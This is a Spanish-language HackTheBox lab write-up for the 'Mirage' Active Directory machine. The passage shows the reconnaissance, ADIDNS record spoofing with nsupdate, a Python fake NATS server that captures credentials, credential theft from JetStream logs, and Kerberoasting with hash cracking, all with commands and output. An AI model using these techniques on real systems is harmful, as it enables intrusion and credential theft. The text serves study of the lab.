---
title: Mirage - Hard (HTB)
permalink: /Mirage-HTB-Writeup/
tags:
  - NATS
  - Windows
  - Hard
  - "ACL Rights"
  - "ADIDNS Spoofing"
  - "Kerberos"
  - "BloodHound"
  - Kerberoasting
  - "RemotePotato0"
  - "NTLM Relay"
  - "ForceChangePassword"
  - "ReadGMSAPassword"
  - "ESC10"
  - "AD CS"
  - RBCD
  - "DC Sync"
categories:
  - writeup
  - hacking
  - hackthebox
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
seo_tittle: Mirage - Hard (HTB)
seo_description: Abusa de ADIDNS, un servidor NATS, NTLM Relay de sesiones activas, derechos ACL, ESC10 y más para vencer Mirage.
excerpt: Abusa de ADIDNS, un servidor NATS, NTLM Relay de sesiones activas, derechos ACL, ESC10 y más para vencer Mirage.
header:
  overlay_image: /assets/images/headers/mirage-hackthebox.jpg
  overlay_filter: 0.7
  og_image: /assets/images/headers/mirage-hackthebox.jpg
---
![image-center](/assets/images/posts/mirage-hackthebox.png)
{: .align-center}

**Habilidades:** NFS Enumeration, NATS Enumeration, ADIDNS Spoofing + Fake NATS Server, Kerberos Client Setup, Domain Analysis - `Bloodhound`, Kerberoasting, Cross-Session Relay - `RemotePotato0`, Hash Cracking, Abusing AD ACL Rights - `ForceChangePassword` + Removing AD Account Restrictions, Abusing AD ACL Rights - `ReadGMSAPassword`, Abusing AD CS - `ESC10` Technique, Abusing RBCD, DC Sync [Privilege Escalation]
{: .notice--primary}

# Introducción

Mirage es una máquina de dificultad `Hard` en HackTheBox en la que debemos vulnerar un dominio de Active Directory. En este escenario ganaremos acceso inicial a través de enumerar un servidor NFS, suplantar un registro DNS faltante, enumerar el servicio `NATS` y un ataque de  Kerberoasting.

Una vez nos adentramos en el dominio explotaremos técnicas avanzadas de retransmisión NTLM de un usuario autenticado con la herramienta `RemotePotato0.exe`, abuso de derechos ACL quitando restricciones a un usuario, para finalizar explotando el servicio AD CS para obtener acceso privilegiado al dominio a través de un ataque DC Sync.
<br>
# Reconocimiento
---
Enviaremos una traza ICMP para comprobar que la máquina víctima se encuentre activa

~~~ bash
ping -c1 10.10.11.78  
PING 10.10.11.78 (10.10.11.78) 56(84) bytes of data.
64 bytes from 10.10.11.78: icmp_seq=1 ttl=127 time=172 ms

--- 10.10.11.78 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 172.126/172.126/172.126/0.000 ms
~~~


## Port Scanning 

Lanzaremos un escaneo que se encargue de identificar puertos abiertos en la máquina víctima

~~~ bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.78 -oG openPorts
 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-19 15:01 EDT
Nmap scan report for 10.10.11.78
Host is up (0.20s latency).
Not shown: 57928 closed tcp ports (reset), 7580 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
111/tcp   open  rpcbind
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
2049/tcp  open  nfs
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
4222/tcp  open  vrml-multi-use
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
51231/tcp open  unknown
63825/tcp open  unknown
63833/tcp open  unknown
63836/tcp open  unknown
63849/tcp open  unknown
63853/tcp open  unknown
63864/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 22.02 seconds
~~~

- `--open`: Mostrar únicamente los puertos abiertos
- `-p-`: Hacer un escaneo del total de puertos **(65535)**
- `--min-rate 5000`: Enviar mínimo **5000 paquetes por segundo**
- `-n`: No aplicar **resolución DNS**, lo que acelera el escaneo
- `-sS`: Modo de **escaneo TCP SYN**, no concluye la conexión, lo que hace el escaneo más ágil
- `-Pn`: Omitir el **descubrimiento de host (ARP)**
- `-oG`: Exportar en formato `grepable`
- `-v`: Ver el progreso del escaneo

Lanzaremos un segundo escaneo que intente identificar la versión y los servicios que encontramos

~~~ bash
nmap -p 53,88,111,135,139,389,445,464,593,636,2049,3268,3269,4222,5985,9389,47001,49664,49665,49666,49667,49668,63612,63881,63890,63891,63906,63912,63932,63946 -sVC 10.10.11.78 -oN services

Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-21 23:58 -03
Nmap scan report for 10.10.11.78
Host is up (0.25s latency).

PORT      STATE SERVICE         VERSION
53/tcp    open  domain          Simple DNS Plus
88/tcp    open  kerberos-sec    Microsoft Windows Kerberos (server time: 2025-11-22 09:58:56Z)
111/tcp   open  rpcbind         2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc           Microsoft Windows RPC
139/tcp   open  netbios-ssn     Microsoft Windows netbios-ssn
389/tcp   open  ldap            Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
| Not valid before: 2025-07-04T19:58:41
|_Not valid after:  2105-07-04T19:58:41
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http      Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap        Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
| Not valid before: 2025-07-04T19:58:41
|_Not valid after:  2105-07-04T19:58:41
2049/tcp  open  nlockmgr        1-4 (RPC #100021)
3268/tcp  open  ldap            Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
| Not valid before: 2025-07-04T19:58:41
|_Not valid after:  2105-07-04T19:58:41
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap        Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
| Not valid before: 2025-07-04T19:58:41
|_Not valid after:  2105-07-04T19:58:41
|_ssl-date: TLS randomness does not represent time
4222/tcp  open  vrml-multi-use?
| fingerprint-strings: 
|   GenericLines: 
|     INFO {"server_id":"NCAMTFE3VK2OHVLWM2LYNIXS4FDHEHAV5WUXHV4MDMXGHDPEAHGUSXZJ","server_name":"NCAMTFE3VK2OHVLWM2LYNIXS4FDHEHAV5WUXHV4MDMXGHDPEAHGUSXZJ","version":"2.11.3","proto":1,"git_commit":"a82cfda","go":"go1.24.2","host":"0.0.0.0","port":4222,"headers":true,"auth_required":true,"max_payload":1048576,"jetstream":true,"client_id":1028,"client_ip":"10.10.14.118","xkey":"XAXFWLXMWX2JNCUQS5Q46GDZNRPV2YDKOSQJNSLOT6BHR3PD5Z6FFZDE"} 
|     -ERR 'Authorization Violation'
|   GetRequest: 
|     INFO {"server_id":"NCAMTFE3VK2OHVLWM2LYNIXS4FDHEHAV5WUXHV4MDMXGHDPEAHGUSXZJ","server_name":"NCAMTFE3VK2OHVLWM2LYNIXS4FDHEHAV5WUXHV4MDMXGHDPEAHGUSXZJ","version":"2.11.3","proto":1,"git_commit":"a82cfda","go":"go1.24.2","host":"0.0.0.0","port":4222,"headers":true,"auth_required":true,"max_payload":1048576,"jetstream":true,"client_id":1029,"client_ip":"10.10.14.118","xkey":"XAXFWLXMWX2JNCUQS5Q46GDZNRPV2YDKOSQJNSLOT6BHR3PD5Z6FFZDE"} 
|     -ERR 'Authorization Violation'
|   HTTPOptions: 
|     INFO {"server_id":"NCAMTFE3VK2OHVLWM2LYNIXS4FDHEHAV5WUXHV4MDMXGHDPEAHGUSXZJ","server_name":"NCAMTFE3VK2OHVLWM2LYNIXS4FDHEHAV5WUXHV4MDMXGHDPEAHGUSXZJ","version":"2.11.3","proto":1,"git_commit":"a82cfda","go":"go1.24.2","host":"0.0.0.0","port":4222,"headers":true,"auth_required":true,"max_payload":1048576,"jetstream":true,"client_id":1030,"client_ip":"10.10.14.118","xkey":"XAXFWLXMWX2JNCUQS5Q46GDZNRPV2YDKOSQJNSLOT6BHR3PD5Z6FFZDE"} 
|     -ERR 'Authorization Violation'
|   NULL: 
|     INFO {"server_id":"NCAMTFE3VK2OHVLWM2LYNIXS4FDHEHAV5WUXHV4MDMXGHDPEAHGUSXZJ","server_name":"NCAMTFE3VK2OHVLWM2LYNIXS4FDHEHAV5WUXHV4MDMXGHDPEAHGUSXZJ","version":"2.11.3","proto":1,"git_commit":"a82cfda","go":"go1.24.2","host":"0.0.0.0","port":4222,"headers":true,"auth_required":true,"max_payload":1048576,"jetstream":true,"client_id":1027,"client_ip":"10.10.14.118","xkey":"XAXFWLXMWX2JNCUQS5Q46GDZNRPV2YDKOSQJNSLOT6BHR3PD5Z6FFZDE"} 
|_    -ERR 'Authentication Timeout'
5985/tcp  open  http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf          .NET Message Framing
47001/tcp open  http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc           Microsoft Windows RPC
49665/tcp open  msrpc           Microsoft Windows RPC
49666/tcp open  msrpc           Microsoft Windows RPC
49667/tcp open  msrpc           Microsoft Windows RPC
49668/tcp open  msrpc           Microsoft Windows RPC
63612/tcp open  msrpc           Microsoft Windows RPC
63881/tcp open  msrpc           Microsoft Windows RPC
63890/tcp open  ncacn_http      Microsoft Windows RPC over HTTP 1.0
63891/tcp open  msrpc           Microsoft Windows RPC
63906/tcp open  msrpc           Microsoft Windows RPC
63912/tcp open  msrpc           Microsoft Windows RPC
63932/tcp open  msrpc           Microsoft Windows RPC
63946/tcp open  msrpc           Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4222-TCP:V=7.95%I=7%D=11/21%Time=692126EB%P=x86_64-apple-darwin23.4
SF:.0%r(NULL,1D2,"INFO\x20{\"server_id\":\"NCAMTFE3VK2OHVLWM2LYNIXS4FDHEHA
SF:V5WUXHV4MDMXGHDPEAHGUSXZJ\",\"server_name\":\"NCAMTFE3VK2OHVLWM2LYNIXS4
SF:FDHEHAV5WUXHV4MDMXGHDPEAHGUSXZJ\",\"version\":\"2\.11\.3\",\"proto\":1,
SF:\"git_commit\":\"a82cfda\",\"go\":\"go1\.24\.2\",\"host\":\"0\.0\.0\.0\
SF:",\"port\":4222,\"headers\":true,\"auth_required\":true,\"max_payload\"
SF::1048576,\"jetstream\":true,\"client_id\":1027,\"client_ip\":\"10\.10\.
SF:14\.118\",\"xkey\":\"XAXFWLXMWX2JNCUQS5Q46GDZNRPV2YDKOSQJNSLOT6BHR3PD5Z
SF:6FFZDE\"}\x20\r\n-ERR\x20'Authentication\x20Timeout'\r\n")%r(GenericLin
SF:es,1D3,"INFO\x20{\"server_id\":\"NCAMTFE3VK2OHVLWM2LYNIXS4FDHEHAV5WUXHV
SF:4MDMXGHDPEAHGUSXZJ\",\"server_name\":\"NCAMTFE3VK2OHVLWM2LYNIXS4FDHEHAV
SF:5WUXHV4MDMXGHDPEAHGUSXZJ\",\"version\":\"2\.11\.3\",\"proto\":1,\"git_c
SF:ommit\":\"a82cfda\",\"go\":\"go1\.24\.2\",\"host\":\"0\.0\.0\.0\",\"por
SF:t\":4222,\"headers\":true,\"auth_required\":true,\"max_payload\":104857
SF:6,\"jetstream\":true,\"client_id\":1028,\"client_ip\":\"10\.10\.14\.118
SF:\",\"xkey\":\"XAXFWLXMWX2JNCUQS5Q46GDZNRPV2YDKOSQJNSLOT6BHR3PD5Z6FFZDE\
SF:"}\x20\r\n-ERR\x20'Authorization\x20Violation'\r\n")%r(GetRequest,1D3,"
SF:INFO\x20{\"server_id\":\"NCAMTFE3VK2OHVLWM2LYNIXS4FDHEHAV5WUXHV4MDMXGHD
SF:PEAHGUSXZJ\",\"server_name\":\"NCAMTFE3VK2OHVLWM2LYNIXS4FDHEHAV5WUXHV4M
SF:DMXGHDPEAHGUSXZJ\",\"version\":\"2\.11\.3\",\"proto\":1,\"git_commit\":
SF:\"a82cfda\",\"go\":\"go1\.24\.2\",\"host\":\"0\.0\.0\.0\",\"port\":4222
SF:,\"headers\":true,\"auth_required\":true,\"max_payload\":1048576,\"jets
SF:tream\":true,\"client_id\":1029,\"client_ip\":\"10\.10\.14\.118\",\"xke
SF:y\":\"XAXFWLXMWX2JNCUQS5Q46GDZNRPV2YDKOSQJNSLOT6BHR3PD5Z6FFZDE\"}\x20\r
SF:\n-ERR\x20'Authorization\x20Violation'\r\n")%r(HTTPOptions,1D3,"INFO\x2
SF:0{\"server_id\":\"NCAMTFE3VK2OHVLWM2LYNIXS4FDHEHAV5WUXHV4MDMXGHDPEAHGUS
SF:XZJ\",\"server_name\":\"NCAMTFE3VK2OHVLWM2LYNIXS4FDHEHAV5WUXHV4MDMXGHDP
SF:EAHGUSXZJ\",\"version\":\"2\.11\.3\",\"proto\":1,\"git_commit\":\"a82cf
SF:da\",\"go\":\"go1\.24\.2\",\"host\":\"0\.0\.0\.0\",\"port\":4222,\"head
SF:ers\":true,\"auth_required\":true,\"max_payload\":1048576,\"jetstream\"
SF::true,\"client_id\":1030,\"client_ip\":\"10\.10\.14\.118\",\"xkey\":\"X
SF:AXFWLXMWX2JNCUQS5Q46GDZNRPV2YDKOSQJNSLOT6BHR3PD5Z6FFZDE\"}\x20\r\n-ERR\
SF:x20'Authorization\x20Violation'\r\n");
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h00m00s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-11-22T09:59:57
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 90.69 seconds
~~~

- `-p`: Especificar puertos
- `-sV`: Identificar la versión del servicio 
- `-sC`: Uso de scripts de reconocimiento
- `-oN`: Exportar la salida en formato normal

Podemos decir que estamos frente a un controlador de dominio debido a que vemos que la captura muestra gran cantidad de servicios, como `dns`, `kerberos`, `ldap`, etc. 

Además, logramos ver tanto el nombre del dominio como del DC, agregaremos esta información a nuestro archivo `/etc/hosts` para poder resolver aplicar resolución DNS correctamente hacia el dominio

``` bash
echo '10.10.11.78 mirage.htb dc01.mirage.htb' | sudo tee -a /etc/hosts

mirage.htb dc01.mirage.htb
```


## NFS Enumeration

Vemos el puerto `111`, y según el escaneo corresponde al servicio `rpcbind`. Este se trata de un `PortMapper`, y se utiliza para mapear puertos en un servidor NFS

> Un `portmapper`, también conocido como `RPCBind`, es un servicio de red que **asigna números de programa de Llamada a Procedimiento Remoto (RPC) a números de puerto TCP/IP o UDP/IP**.
{: .notice--info}

Podemos listar los directorios que está compartiendo el servidor con la herramienta `showmount`

~~~ bash
showmount -e 10.10.11.78
Export list for 10.10.11.78:
/MirageReports (everyone)
~~~

Vemos que el servidor expone el directorio `MirageReports`, el cual es accesible por cualquiera dentro de la red. 

Podemos intentar montar el recurso en nuestra máquina con el comando `mount` 

~~~ bash
mkdir nfs                              
mount -t nfs 10.10.11.78:/MirageReports nfs
~~~

Una vez montado, veremos dos archivos PDF dentro del directorio `nfs` que creamos para la montura. 

> Por temas de permisos, podemos simplemente copiarlos localmente y asignarle los permisos necesarios para poder abrirlos.
{: .notice--warning}

``` bash
sudo cp nfs/* content
sudo chmod +r content/*

ls -la content 
drwxr-xr-x andrees staff 128 B  Sat Nov 22 13:08:01 2025 .
drwxr-xr-x andrees staff 256 B  Sat Nov 22 13:07:07 2025 ..
.rwxr--r-- root    staff 8.1 MB Sat Nov 22 13:08:00 2025 Incident_Report_Missing_DNS_Record_nats-svc.pdf
.rwxr--r-- root    staff 8.9 MB Sat Nov 22 13:09:14 2025 Mirage_Authentication_Hardening_Report.pdf
```


## Banner Grabbing - `NATS` Server

Si intentamos usar `netcat` para recopilar información del servicio que se ejecuta en el puerto `4222`, notaremos que se trata de un servidor NATS por la respuesta `INFO {...}` (al preguntarle a la IA qué servicio podría ser)

``` bash
nc -v dc01.mirage.htb 4222
dc01.mirage.htb [10.10.11.78] 4222 open
INFO {"server_id":"NBTAKVRQWMOE2F5222LGLTDOQZSJJQB4FUKTJKPDB4DZX75HG5OYPSOZ","server_name":"NBTAKVRQWMOE2F5222LGLTDOQZSJJQB4FUKTJKPDB4DZX75HG5OYPSOZ","version":"2.11.3","proto":1,"git_commit":"a82cfda","go":"go1.24.2","host":"0.0.0.0","port":4222,"headers":true,"auth_required":true,"max_payload":1048576,"jetstream":true,"client_id":154,"client_ip":"10.10.14.118","xkey":"XBKWI3RH4UJHVKSD6ZUYNK4T3SICFGEQIIPHSAS3UTNWQOCBSWPRDYN4"} 
-ERR 'Authentication Timeout'
```


## Scenario Analysis

### NATS Server Error

> `NATS` se trata de una tecnología única que permite a las aplicaciones comunicarse de forma segura a través de cualquier combinación de proveedores de nube, instalaciones locales, periféricos, web y móviles, y dispositivos.
{: .notice--info}

Al abrir el archivo `Incident_Report_Missing_DNS_Record_nats-svc.pdf`, veremos un error que se obtiene al iniciar comunicación hacia un servidor NATS, donde no se resuelve correctamente al hostname `nats-svc`

![image-center](/assets/images/posts/mirage-1-hackthebox.png)
{: .align-center}

### Missing DNS Record

Se adjunta la siguiente información, confirmando que el error es causado por la falta un registro DNS en la zona correspondiente al hostname `nats-svc`

![image-center](/assets/images/posts/mirage-2-hackthebox.png)
{: .align-center}

- Se realizó una limpieza DNS debido a que el host se desconectó por más de `14` días, por lo que el registro `nats-svc` se eliminó automáticamente

La configuración de la Zona DNS posee la opción `Nonsecure and Secure`, esto permite a cualquier host de la red editar registros DNS, como el mensaje indica, permitir esta opción se convierte en una vulnerabilidad, que podemos intentar aprovechar para hacer `Spoofing`

![image-center](/assets/images/posts/mirage-3-hackthebox.png)
{: .align-center}

### Kerberos-only Authentication Model

El otro archivo PDF hace alusión a que se deshabilita la autenticación NTLM para aplicar buenas prácticas y hacer uso de `kerberos` como protocolo principal de autenticación en el dominio

![image-center](/assets/images/posts/mirage-4-hackthebox.png)
{: .align-center}
<br>


# Intrusión / Explotación
---
## ADIDNS Spoofing

> La suplantación de DNS o  `DNS Spoofing`, se refiere a cualquier ataque que intenta cambiar los registros DNS devueltos a un consultante por una respuesta elegida por el atacante.
{: .notice--info}

Por como funciona [DNS en Active Directory](https://learn.microsoft.com/en-us/windows/win32/ad/active-directory-servers-and-dynamic-dns), la tecnología DDNS (Dynamic DNS) es parte del funcionamiento estándar dentro de un dominio, ya que los registros se gestionan de manera automática.

Abusaremos de la anterior configuración insegura que nos debería permitir modificar el registro DNS `nats-svc`, de forma que podamos obtener el tráfico NATS legítimo

### Fake NATS Server

Podríamos usar la herramienta [`nats-server`](https://github.com/nats-io/nats-server) para iniciar un servidor NATS, aunque solo necesitamos realizar una prueba inicial para validar que el tráfico fluye hacia nosotros. 

El siguiente código en `python` nos permite abrir un servidor NATS de forma local utilizando un socket TCP por el puerto usado por NATS (`4222`), con el fin de escuchar solicitudes NATS en la red

~~~ python
#!/usr/bin/env python3
import socket

HOST = "0.0.0.0"
PORT = 4222

print(f"[+] Fake NATS server listening on 0.0.0.0:{PORT}")
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    s.listen()

    while True:
        conn, addr = s.accept()
        print(f"\n[+] Connection from {addr}")
        with conn:
            conn.sendall(b'INFO {"server_id":"FAKE","version":"2.11.0","auth_required":true}\r\n')
            while True:
                data = conn.recv(1024)
                if not data:
                    break
                print(data.decode(errors="ignore"))
~~~

Lanzaremos el script para recibir conexiones por el puerto `4222`

~~~ bash
python3 nats-server.py
[+] Fake NATS server listening on 4222
~~~

### Updating DNS Record

Actualizaremos el registro DNS `nats-svc` para que apunte a nuestra dirección IP usando la herramienta `nsupdate`

~~~ bash
nsupdate
> server 10.10.11.78 
> update add nats-svc.mirage.htb 3600 A 10.10.14.188
> send 
~~~

- `3600` es el `timeout`

En nuestro servidor NATS falso recibiremos una conexión del usuario `Dev_Account_A` intentando autenticarse a nuestro servidor, enviando sus credenciales

~~~ bash

[+] Connection from ('10.10.11.78', 53607)
CONNECT {"verbose":false,"pedantic":false,"user":"Dev_Account_A","pass":"hx5h7F5554fP@1337!","tls_required":false,"name":"NATS CLI Version 0.2.2","lang":"go","version":"1.41.1","protocol":1,"echo":true,"headers":false,"no_responders":false}
PING
~~~

### NATS Auth as `Dev_Account_A`

Disponemos de las credenciales de la cuenta `Dev_Account_A`, las cuales sólo son válidas en este servicio. Para validarlas, podemos utilizar el siguiente comando

~~~ bash
nats -s nats://dc01.mirage.htb:4222 account info --user Dev_Account_A --password 'hx5h7F5554fP@1337!'

Account Information

                           User: Dev_Account_A
                        Account: dev
                        Expires: never
                      Client ID: 166
                      Client IP: 10.10.14.118
                            RTT: 402ms
              Headers Supported: true
                Maximum Payload: 1.0 MiB
                  Connected URL: nats://dc01.mirage.htb:4222
              Connected Address: 10.10.11.78:4222
            Connected Server ID: NBTAKVRQWMOE2F5222LGLTDOQZSJJQB4FUKTJKPDB4DZX75HG5OYPSOZ
       Connected Server Version: 2.11.3
                 TLS Connection: no
~~~

### Streams

Recordemos que este servidor NATS usa la funcionalidad [`JetStream`](https://docs.nats.io/nats-concepts/jetstream), la cual pudimos ver cuando nos conectamos con `netcat` para hacer `Banner Grabbing`.

> NATS tiene un motor de persistencia integrado llamado `JetStream` que permite almacenar mensajes y reproducirlos más adelante.
{: .notice--info}

El almacenamiento de mensajes cuando se utiliza `JetStream` se gestiona a través de [`streams`](https://docs.nats.io/nats-concepts/jetstream/streams).

> Los `streams` o secuencias son almacenes de mensajes, cada secuencia define cómo se almacenan los mensajes y cuáles son los límites (duración, tamaño, interés) de la retención.
{: .notice--info}

Podemos listar estos "contenedores" de mensajes utilizando el comando `stream ls`

``` bash
nats -s nats://dc01.mirage.htb:4222 stream ls --user Dev_Account_A --password 'hx5h7F5554fP@1337!'

╭──────────────────────────────────────────────────────────────────────────────────╮
│                                      Streams                                     │
├───────────┬─────────────┬─────────────────────┬──────────┬───────┬───────────────┤
│ Name      │ Description │ Created             │ Messages │ Size  │ Last Message  │
├───────────┼─────────────┼─────────────────────┼──────────┼───────┼───────────────┤
│ auth_logs │             │ 2025-05-05 03:18:19 │ 5        │ 570 B │ 201d17h41m35s │
╰───────────┴─────────────┴─────────────────────┴──────────┴───────┴───────────────╯

```

La forma recomendada para obtener los mensajes contenidos dentro de un `stream` es utilizar un [`consumer`](https://docs.nats.io/nats-concepts/jetstream/consumers), el cual es una interfaz que funciona como una "vista"

### Stream Messages

Aunque existen formas más directas de hacer esto, por ejemplo utilizando el comando `stream get`, de la siguiente forma

``` bash
nats -s nats://dc01.mirage.htb:4222 stream get auth_logs --user Dev_Account_A --password 'hx5h7F5554fP@1337!' 
? Message Sequence to retrieve 1
Item: auth_logs#1 received 2025-05-05 07:18:56.6788658 +0000 UTC (201d17h48m19s) on Subject logs.auth

{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}
```

- Al ejecutar el comando, podemos especificar el valor `1` para obtener solamente un mensaje.

De esta forma, logramos obtener otras credenciales, las cuales ahora pertenecen al usuario `david.jjackson`. Validaremos estas credenciales frente al Controlador de Dominio utilizando la herramienta `nxc`

>  Al utilizar autenticación `kerberos`, debemos recordar sincronizar nuestro reloj local con el del Controlador de Dominio, esto lo hacemos de forma automática con el comando `ntpdate`
{: .notice--danger}

~~~ bash
sudo ntpdate -u dc01.mirage.htb
nxc smb dc01.mirage.htb -u david.jjackson -p 'pN8kQmn6b86!1234@' -k
 
SMB         dc01.mirage.htb 445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc01.mirage.htb 445    dc01             [+] mirage.htb\david.jjackson:pN8kQmn6b86!1234@
~~~

### Kerberos Client Setup

Como estamos en un entorno que solo admite autenticación `kerberos`, podemos aprovechar la herramienta `netexec` y generar un archivo de configuración válido

``` bash
nxc smb dc01.mirage.htb -u david.jjackson -p 'pN8kQmn6b86!1234@' -k --generate-krb5-file ./krb5.conf 

SMB         dc01.mirage.htb 445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc01.mirage.htb 445    dc01             [+] krb5 conf saved to: ./krb5.conf
SMB         dc01.mirage.htb 445    dc01             [+] Run the following command to use the conf file: export KRB5_CONFIG=./krb5.conf
SMB         dc01.mirage.htb 445    dc01             [+] mirage.htb\david.jjackson:pN8kQmn6b86!1234@ 
```

Ahora haremos uso de la configuración `kerberos` con el comando que nos sugiere la herramienta

``` bash
export KRB5_CONFIG=./krb5.conf
```


## Domain Analysis - `Bloodhound`

Finalmente tenemos credenciales válidas a nivel de dominio, podemos utilizarlas para enumerar información con `Bloodhound` y buscar posibles vectores de ataque, con el fin de realizar movimiento lateral/escalada de privilegios.

``` bash
bloodhound-ce-python -d mirage.htb -u david.jjackson -p 'pN8kQmn6b86!1234@' -k -ns 10.10.11.78 -c All

INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: mirage.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.mirage.htb
...
...
<SNIP>
```


## Kerberoasting

> Este ataque aprovecha las cuentas que tienen configurado un SPN (`Service Principal Name`), donde cualquier usuario autenticado puede solicitar un ticket de servicio para obtener un hash TGS e intentar descifrarlo de forma off-line.
{: .notice--info}

Dentro de `Bloodhound`, notaremos que la cuenta `nathan.aadam` es vulnerable a `Kerberoasting`

![image-center](/assets/images/posts/mirage-5-hackthebox.png)
{: .align-center}

Si consultamos los grupos a los que pertenece `nathan.aadam`, notaremos que puede conectarse al DC al ser miembro de `Remote Management Users`.

> El grupo [`Remote Management Users`](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#remote-management-users) en Active Directory permite a los usuarios miembros acceder de manera remota a un equipo a través del protocolo `WinRM`, el cual está basado en el estándar `WS-Management`.
{: .notice--info}

![image-center](/assets/images/posts/mirage-6-hackthebox.png)
{: .align-center}

Antes de lanzar el ataque, solicitaremos un TGT para el usuario `david.jjackson`

~~~ bash
getTGT.py mirage.htb/david.jjackson:'pN8kQmn6b86!1234@' -dc-ip dc01.mirage.htb

Impacket v0.13.0.dev0+20250109.91705.ac02e0ee - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in david.jjackson.ccache
~~~

Podemos hacer uso de la herramienta `impacket-GetUsersSPN` para solicitar el TGS (`Ticket Granting Service`) para el SPN asociado a la cuenta `nathan.aadam`.

~~~ bash
KRB5CCNAME=david.jjackson.ccache GetUserSPNs.py mirage.htb/david.jjackson -dc-host dc01.mirage.htb -k -no-pass -request

Impacket v0.13.0.dev0+20250109.91705.ac02e0ee - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName      Name          MemberOf                                                             PasswordLastSet             LastLogon                   Delegation 
------------------------  ------------  -------------------------------------------------------------------  --------------------------  --------------------------  ----------
HTTP/exchange.mirage.htb  nathan.aadam  CN=Exchange_Admins,OU=Groups,OU=Admins,OU=IT_Staff,DC=mirage,DC=htb  2025-06-23 17:18:18.584667  2025-07-19 23:22:43.139357             



$krb5tgs$23$*nathan.aadam$MIRAGE.HTB$mirage.htb/nathan.aadam*$867...
~~~

Guardaremos el hash en un archivo y lo intentaremos descifrar con `john` o `hashcat`

~~~ bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash_tgs.txt --format=krb5tgs 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
3edc#EDC3        (?)     
1g 0:00:00:07 DONE (2025-07-20 01:20) 0.1282g/s 1598Kp/s 1598Kc/s 1598KC/s 3er733..3ddfiebw
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
~~~


## Shell as `nathan.aadam`

Encontramos la contraseña de `nathan.aadam`, podemos solicitar un TGT para poder conectarnos vía `evil-winrm-py` al dominio
